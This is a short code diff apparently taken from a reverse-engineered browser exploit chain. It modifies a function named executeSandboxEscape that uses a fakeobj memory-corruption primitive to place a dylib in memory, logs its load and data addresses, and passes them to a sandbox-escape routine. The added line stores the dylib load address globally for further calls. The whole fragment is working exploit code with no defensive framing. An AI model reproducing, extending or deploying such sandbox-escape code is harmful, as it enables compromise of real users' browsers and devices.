@@ -1453,6 +1453,7 @@ async function executeSandboxEscape() {/* Original: yA → executeSandboxEscape 
         const dylibLoadAddressI64 = utilityModule.Int64.fromNumber(dylibLoadAddress),
             dylibDataAddressMaybe = utilityModule.Int64.fromNumber(platformModule.platformState.exploitPrimitive.fakeobj(dylibBuffer));
         window.log("dylib load address: 0x" + dylibLoadAddress.toString(16));
+        globalThis.__whs_bsAddr = dylibLoadAddress;  // WHS: save for direct jd() calls
         window.log("data address?: 0x" + dylibDataAddressMaybe.toNumber().toString(16));
         window.log("dylib size: 0x" + dylibSize);
         platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
